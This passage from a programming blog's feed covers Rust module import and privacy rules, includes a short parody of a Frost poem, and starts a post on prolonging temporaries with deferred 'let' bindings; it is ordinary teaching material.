</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// nope</span>
</span><span class='line'>    <span class="c1">// use mem::replace;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>As mentioned before, <code>use</code> paths are relative to the root module. There is no <code>mem</code>
in the root module, so this won&rsquo;t work. We can make it work via <code>self</code>, which I mentioned
before:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>    <span class="c1">// yep!</span>
</span><span class='line'>    <span class="kn">use</span> <span class="bp">self</span><span class="o">::</span><span class="n">mem</span><span class="o">::</span><span class="n">replace</span><span class="p">;</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p></p>

<p>Note that this brings overloading of the <code>self</code> keyword up to a grand total of <em>four</em>! Two cases
which occur in the import/path system:</p>

<ul>
<li><code>use self::foo</code> means &ldquo;find me <code>foo</code> within the current module&rdquo;</li>
<li><code>use foo::bar::{self, baz}</code> is equivalent to <code>use foo::bar; use foo::bar::baz;</code></li>
<li><code>fn foo(&amp;self)</code> lets you define methods and specify if the receiver is by-move, borrowed, mutably borrowed, or other</li>
<li><code>Self</code> within implementations lets you refer to the type being implemented on</li>
</ul>


<p>Oh well, at least it&rsquo;s not <code>static</code>.</p>

<hr />

<p><br><br></p>

<p>Going back to one of the examples I gave at the beginning:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">use</span> <span class="n">std</span><span class="o">::</span><span class="n">mem</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">use</span> <span class="n">mem</span><span class="o">::</span><span class="n">transmute</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>    <span class="k">pub</span> <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">transmute</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>(<a href="http://play.integer32.com/?gist=49415d74214b07b13c236ce88bdf54aa&amp;version=undefined">playpen</a>)</p>

<p>It should be clearer now why this works. The root module imports <code>mem</code>. Now, from everyone&rsquo;s point
of view, there&rsquo;s an item called <code>mem</code> in the root.</p>

<p>Within <code>mod foo</code>, <code>use mem::transmute</code> works because <code>use</code> is relative to the root, and <code>mem</code>
already exists in the root! When you <code>use</code> something, all child modules will see it as if it were
actually belonging to the module. (Non-child modules won&rsquo;t see it because of privacy, we
saw an example of this already)</p>

<p>This is why <code>use foo::transmute</code> works from <code>mod bar</code>, too. <code>bar</code> can refer to the contents
of <code>foo</code> via <code>use foo::whatever</code>, since <code>foo</code> is a child of the root module, and <code>use</code> is relative
to the root. <code>foo</code> already has an item named <code>transmute</code> inside it because it imported one.
Nothing in the parent module is private from the child, so we can <code>use foo::transmute</code> from
<code>bar</code>.</p>

<p>Generally, the standard way of doing things is to either not use modules (just a single lib.rs),
or, if you do use modules, put nothing other than <code>extern crate</code>s and <code>mod</code>s in the root.
This is why we rarely see shenanigans like the above; there&rsquo;s nothing in the root crate
to import, aside from other crates specified by <code>extern crate</code>. The trick of
&ldquo;reimport something from the parent module&rdquo; is also pretty rare because there&rsquo;s basically no
point to using that (just import it directly!). So this is not the kind of code
you&rsquo;ll see in the wild.</p>

<hr />

<p><br></p>

<p>Basically, the way the import system works can be summed up as:</p>

<ul>
<li><code>extern crate</code> and <code>use</code> will act as if they were defining the imported item in the current module, like a symbolic link</li>
<li><code>use foo::bar::baz</code> resolves the path relative to the root module</li>
<li><code>foo::bar::baz</code> in an inline path (i.e. not in a <code>use</code>) will resolve relative to the current module</li>
<li><code>::foo::bar::baz</code> will <em>always</em> resolve relative to the root module</li>
<li><code>self::foo::bar::baz</code> will <em>always</em> resolve relative to the current module</li>
<li><code>super::foo::bar::baz</code> will <em>always</em> resolve relative to the parent module</li>
</ul>


<p>Alright, on to the other half of this. Privacy.</p>

<h3>Privacy</h3>

<p>So how does privacy work?</p>

<p>Privacy, too, follows some basic rules:</p>

<ul>
<li>If you can access a module, you can access all of its <code>pub</code> contents</li>
<li>A module can always access its child modules, but not recursively

<ul>
<li>This means that a module cannot access private items in its children, nor can it access private grandchildren modules</li>
</ul>
</li>
<li>A child can always access its parent modules (and their parents), and <em>all</em> their contents</li>
<li><code>pub(restricted)</code> <a href="https://github.com/rust-lang/rfcs/blob/master/text/1422-pub-restricted.md">is a proposal</a> which extends this a bit, but it&rsquo;s experimental so we won&rsquo;t deal with it here</li>
</ul>


<p>Giving some examples,</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// can access `foo::foofunc`, even though `foofunc` is private</span>
</span><span class='line'>
</span><span class='line'>        <span class="k">pub</span> <span class="k">fn</span> <span class="n">barfunc</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="c1">// can access `foo::bar::barfunc()`, even though `bar` is private</span>
</span><span class='line'>    <span class="k">fn</span> <span class="n">foofunc</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="c1">// We can access our parent and _all_ its contents,</span>
</span><span class='line'>        <span class="c1">// so we have access to `foo::baz`. We can access</span>
</span><span class='line'>        <span class="c1">// all pub contents of modules we have access to, so we</span>
</span><span class='line'>        <span class="c1">// can access `foo::baz::bazfunc`</span>
</span><span class='line'>        <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">baz</span><span class="o">::</span><span class="n">bazfunc</span><span class="p">;</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="kn">mod</span> <span class="n">baz</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">pub</span> <span class="k">fn</span> <span class="n">bazfunc</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>It&rsquo;s important to note that this is all contextual; whether or not a particular
path works is a function of where you are. For example, this works<sup id="fnref:4"><a href="#fn:4" rel="footnote">4</a></sup>:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="k">pub</span> <span class="kn">mod</span> <span class="n">foo</span> <span class="p">{</span>
</span><span class='line'>    <span class="cm">/* not pub */</span> <span class="kn">mod</span> <span class="n">bar</span> <span class="p">{</span>
</span><span class='line'>        <span class="k">pub</span> <span class="kn">mod</span> <span class="n">baz</span> <span class="p">{</span>
</span><span class='line'>            <span class="k">pub</span> <span class="k">fn</span> <span class="n">bazfunc</span><span class="p">()</span> <span class="p">{}</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>        <span class="k">pub</span> <span class="kn">mod</span> <span class="n">quux</span> <span class="p">{</span>
</span><span class='line'>            <span class="kn">use</span> <span class="n">foo</span><span class="o">::</span><span class="n">bar</span><span class="o">::</span><span class="n">baz</span><span class="o">::</span><span class="n">bazfunc</span><span class="p">;</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>We are able to write the path <code>foo::bar::baz::bazfunc</code> even though <code>bar</code> is private!</p>

<p>This is because we still have <em>access</em> to the module <code>bar</code>, by being a descendent module.</p>

<hr />

<p><br></p>

<p>Hopefully this is helpful to some of you. I&rsquo;m not really sure how this can fit into the official
docs, but if you have ideas, feel free to adapt it<sup id="fnref:5"><a href="#fn:5" rel="footnote">5</a></sup>!</p>
<div class="footnotes">
<hr/>
<ol>
<li id="fn:1">
<p>This is because most of these misunderstandings lead to a model where you think fewer things compile, which is fine as long as it isn&rsquo;t too restrictive. Having a mental model where you feel more things will compile than actually do is what leads to frustration; the opposite can just be restrictive.<a href="#fnref:1" rev="footnote">&#8617;</a></p></li>
<li id="fn:2">
<p>One example closer to home is how Rust does lifetime resolution. Lifetimes form a lattice with <code>'static</code> being the bottom element. There is no top element for lifetimes in Rust syntax, but internally <a href="http://manishearth.github.io/rust-internals-docs/rustc/ty/enum.Region.html#variant.ReEmpty">there is the &ldquo;empty lifetime&rdquo;</a> which is used during borrow checking. If something resolves to have an empty lifetime, it can&rsquo;t exist, so we get a lifetime error.<a href="#fnref:2" rev="footnote">&#8617;</a></p></li>
<li id="fn:3">
<p>When I say &ldquo;within your code&rdquo;, I mean &ldquo;anywhere but a <code>use</code> statement&rdquo;. I may also term these as &ldquo;inline paths&rdquo;.<a href="#fnref:3" rev="footnote">&#8617;</a></p></li>
<li id="fn:4">
<p>Example adapted from <a href="https://www.reddit.com/r/rust/comments/5m4w95/the_rust_module_system_is_too_confusing/dc1df2z/">this discussion</a><a href="#fnref:4" rev="footnote">&#8617;</a></p></li>
<li id="fn:5">
<p>Contact me if you have licensing issues; I still have to figure out the licensing situation for the blog, but am more than happy to grant exceptions for content being uplifted into official or semi-official docs.<a href="#fnref:5" rev="footnote">&#8617;</a></p></li>
</ol>
</div>

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Two Interpretations Diverged in a Yellow Wood]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/05/02/two-interpretations-diverged-in-a-yellow-wood/"/>
    <updated>2017-05-02T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/05/02/two-interpretations-diverged-in-a-yellow-wood</id>
    <content type="html"><![CDATA[<p>Whose words are these I think I know<br>
His house is in the village though<br>
He will not see me stopping here<br>
To interpret his work as I go<br></p>

<p>My little student must think it queer<br>
To read without some context near<br>
Between the words and the intent<br>
He wonders what the poem meant<br></p>

<p>He gives his head a little shake<br>
To ask if there is some mistake<br>
&ldquo;That&rsquo;s not what the author said!&rdquo;<br>
Providing another view instead<br></p>

<p>The words are lovely, dark, and deep<br>
But I have literary criticism to preach<br>
And miles to go before I sleep<br>
And miles to go before I sleep<br></p>

<hr />

<p><br><br><br><br><br></p>

<p>Seriously though, try reading <em>The Road Not Taken</em> as metacircular commentary on how the poem
<a href="https://en.wikipedia.org/wiki/The_Road_Not_Taken#Analysis">is very often &ldquo;mis&#8221;interpreted</a>, and the nature of interpretation / <em>Death of the Author</em>. It fits perfectly when
you read &ldquo;road&rdquo; as &ldquo;interpretation&rdquo;.</p>

<p><small>(Yes, I know, the parody above is not based on <em>The Road Not Taken</em> but instead a different Frost
poem. I was originally going to modify <em>The Road Not Taken</em> but realized all I had to do was change
a few words to get there, which was no fun at all) </small></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Prolonging Temporaries in Rust]]></title>
    <link href="http://manishearth.github.io/blog_staging/blog/2017/04/13/prolonging-temporaries-in-rust/"/>
    <updated>2017-04-13T00:00:00+00:00</updated>
    <id>http://manishearth.github.io/blog_staging/blog/2017/04/13/prolonging-temporaries-in-rust</id>
    <content type="html"><![CDATA[<p>A colleague of mine learning Rust had an interesting type / borrow checker error. The solution needs
a less-used feature of Rust (which basically exists precisely for this kind of thing), so I thought
I&rsquo;d document it.</p>

<p>The code was like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span> <span class="c1">// returns Option&lt;&amp;Foo&gt;, borrowed from `thing`</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">()</span> <span class="c1">// returns Option&lt;Foo&gt;</span>
</span><span class='line'><span class="p">};</span>
</span><span class='line'>
</span><span class='line'><span class="kn">use</span><span class="p">(</span><span class="n">maybe_foo</span><span class="p">);</span>
</span></code></pre></td></tr></table></div></figure>


<p>If you want to follow along, here is a full program that does this (<a href="https://play.rust-lang.org/?gist=e09a79b511e347fe786e4689d282b806&amp;version=stable&amp;backtrace=0">playpen</a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="cp">#[derive(Debug)]</span>
</span><span class='line'><span class="k">struct</span> <span class="n">Foo</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'><span class="k">struct</span> <span class="n">Thingy</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">foo</span><span class="o">:</span> <span class="n">Foo</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'><span class="k">impl</span> <span class="n">Thingy</span> <span class="p">{</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">get_ref</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">Option</span><span class="o">&lt;&amp;</span><span class="n">Foo</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">Some</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">.</span><span class="n">foo</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">get_owned</span><span class="p">(</span><span class="o">&amp;</span><span class="bp">self</span><span class="p">)</span> <span class="o">-&gt;</span> <span class="nb">Option</span><span class="o">&lt;</span><span class="n">Foo</span><span class="o">&gt;</span> <span class="p">{</span>
</span><span class='line'>        <span class="nb">Some</span><span class="p">(</span><span class="n">Foo</span><span class="p">)</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'>    <span class="k">pub</span> <span class="k">fn</span> <span class="n">new</span><span class="p">()</span> <span class="o">-&gt;</span> <span class="n">Self</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">Thingy</span> <span class="p">{</span>
</span><span class='line'>            <span class="n">foo</span><span class="o">:</span> <span class="n">Foo</span>
</span><span class='line'>        <span class="p">}</span>
</span><span class='line'>    <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'>
</span><span class='line'><span class="k">pub</span> <span class="k">fn</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">some_condition</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">thing</span> <span class="o">=</span> <span class="n">Thingy</span><span class="o">::</span><span class="n">new</span><span class="p">();</span>
</span><span class='line'>
</span><span class='line'>    <span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span> <span class="c1">// returns Option&lt;&amp;Foo&gt;, borrowed from `thing`</span>
</span><span class='line'>    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>        <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">()</span> <span class="c1">// returns Option&lt;Foo&gt;</span>
</span><span class='line'>    <span class="p">};</span>
</span><span class='line'>
</span><span class='line'>    <span class="nb">println</span><span class="o">!</span><span class="p">(</span><span class="s">&quot;{:?}&quot;</span><span class="p">,</span> <span class="n">maybe_foo</span><span class="p">);</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>I&rsquo;m only going to be changing the contents of <code>main()</code> here.</p>

<p>What&rsquo;s happening here is that a non-<code>Copy</code> type, <code>Foo</code>, is returned in an <code>Option</code>. In one case,
we have a reference to the <code>Foo</code>, and in another case an owned copy.</p>

<p>We want to set a variable to these, but of course we can&rsquo;t because they&rsquo;re different types.</p>

<p>In one case, we have an owned <code>Foo</code>, and we can usually obtain a borrow from an owned type. For
<code>Option</code>, there&rsquo;s a convenience method <code>.as_ref()</code> that does this<sup id="fnref:1"><a href="#fn:1" rel="footnote">1</a></sup>. Let&rsquo;s try using that (<a href="https://play.rust-lang.org/?gist=41c3f836b9485c216ccb05c257ae5326&amp;version=stable&amp;backtrace=0">playpen</a>):</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">().</span><span class="n">as_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This will give us an error.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">borrowed</span> <span class="n">value</span> <span class="n">does</span> <span class="n">not</span> <span class="n">live</span> <span class="n">long</span> <span class="n">enough</span>
</span><span class='line'>  <span class="o">--&gt;</span> <span class="o">&lt;</span><span class="n">anon</span><span class="o">&gt;:</span><span class="mi">32</span><span class="o">:</span><span class="mi">5</span>
</span><span class='line'>   <span class="o">|</span>
</span><span class='line'><span class="mi">31</span> <span class="o">|</span>         <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">().</span><span class="n">as_ref</span><span class="p">()</span>
</span><span class='line'>   <span class="o">|</span>         <span class="o">-----------------</span> <span class="n">temporary</span> <span class="n">value</span> <span class="n">created</span> <span class="n">here</span>
</span><span class='line'><span class="mi">32</span> <span class="o">|</span>     <span class="p">};</span>
</span><span class='line'>   <span class="o">|</span>     <span class="o">^</span> <span class="n">temporary</span> <span class="n">value</span> <span class="n">dropped</span> <span class="n">here</span> <span class="k">while</span> <span class="n">still</span> <span class="n">borrowed</span>
</span><span class='line'><span class="p">...</span>
</span><span class='line'><span class="mi">35</span> <span class="o">|</span> <span class="p">}</span>
</span><span class='line'>   <span class="o">|</span> <span class="o">-</span> <span class="n">temporary</span> <span class="n">value</span> <span class="n">needs</span> <span class="n">to</span> <span class="n">live</span> <span class="n">until</span> <span class="n">here</span>
</span><span class='line'>
</span><span class='line'><span class="n">error</span><span class="o">:</span> <span class="n">aborting</span> <span class="n">due</span> <span class="n">to</span> <span class="n">previous</span> <span class="n">error</span>
</span></code></pre></td></tr></table></div></figure>


<p>The problem is, <code>thing.get_owned()</code> returns an owned value. There&rsquo;s nothing that it gets anchored to
(we don&rsquo;t set its value to a variable), so it is just a temporary &ndash; we can call methods on it, but
once we&rsquo;re done the value will go out of scope.</p>

<p>What we want is something like</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="kd">let</span> <span class="n">owned</span> <span class="o">=</span> <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">();</span>
</span><span class='line'>    <span class="n">owned</span><span class="p">.</span><span class="n">as_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>but this will still give a borrow error &ndash; <code>owned</code> will still go out of scope within the <code>if</code> block,
and we need the reference to it last as long as <code>maybe_foo</code> (outside the block) is supposed to last.</p>

<p>So this is no good.</p>

<p>An alternate solution here <em>can</em> be copying/cloning the <code>Foo</code> in the <em>first</em> case by calling <code>.map(|x|
x.clone())</code> or <code>.cloned()</code> or something. Sometimes you don&rsquo;t want to clone, so this isn&rsquo;t great.</p>

<p>Another solution here &ndash; the generic advice for dealing with values which may be owned or borrow &ndash;
is to use <code>Cow</code>. It does incur a runtime check, though; one which can be optimized out if things are
inlined enough.</p>

<p>What we need to do here is to extend the lifetime of the temporary returned by <code>thing.get_owned()</code>.
We need to extend it <em>past</em> the scope of the <code>if</code>.</p>

<p>One way to do this is to have an <code>Option</code> outside that scope which we mutate (<a href="https://play.rust-lang.org/?gist=7868045f2cebec6d23e7a065f5823767&amp;version=stable&amp;backtrace=0">playpen</a>).</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">owned</span> <span class="o">=</span> <span class="nb">None</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">owned</span> <span class="o">=</span> <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">();</span>
</span><span class='line'>    <span class="n">owned</span><span class="p">.</span><span class="n">as_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>This works in this case, but in this case we already had an <code>Option</code>. If <code>get_ref()</code> and <code>get_owned()</code>
returned <code>&amp;Foo</code> and <code>Foo</code> respectively, then we&rsquo;d need to do something like:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="k">mut</span> <span class="n">owned</span> <span class="o">=</span> <span class="nb">None</span><span class="p">;</span>
</span><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">owned</span> <span class="o">=</span> <span class="nb">Some</span><span class="p">(</span><span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">());</span>
</span><span class='line'>    <span class="n">owned</span><span class="p">.</span><span class="n">as_ref</span><span class="p">().</span><span class="n">unwrap</span><span class="p">()</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>which is icky since it introduces an unwrap.</p>

<p>What we really need is a way to signal to the compiler that it needs to hold on to that temporary
for the scope of the enclosing block.</p>

<p>We can do that! (<a href="https://play.rust-lang.org/?gist=1ddf2a428e73b01baa72acdad7cbbf2b&amp;version=stable&amp;backtrace=0">playpen</a>)</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='rust'><span class='line'><span class="kd">let</span> <span class="n">owned</span><span class="p">;</span> <span class="c1">// 😯😯😯😯😯</span>
</span><span class='line'><span class="kd">let</span> <span class="n">maybe_foo</span> <span class="o">=</span> <span class="k">if</span> <span class="n">some_condition</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">thing</span><span class="p">.</span><span class="n">get_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>    <span class="n">owned</span> <span class="o">=</span> <span class="n">thing</span><span class="p">.</span><span class="n">get_owned</span><span class="p">();</span>
</span><span class='line'>    <span class="n">owned</span><span class="p">.</span><span class="n">as_ref</span><span class="p">()</span>
</span><span class='line'><span class="p">};</span>
</span></code></pre></td></tr></table></div></figure>


<p>We know that Rust doesn&rsquo;t do &ldquo;uninitialized&rdquo; variables. If you want to name a variable, you have to
initialize it. <code>let foo;</code> feels rather like magic in this context, because it looks like we&rsquo;ve declared
an uninitialized variable.</p>

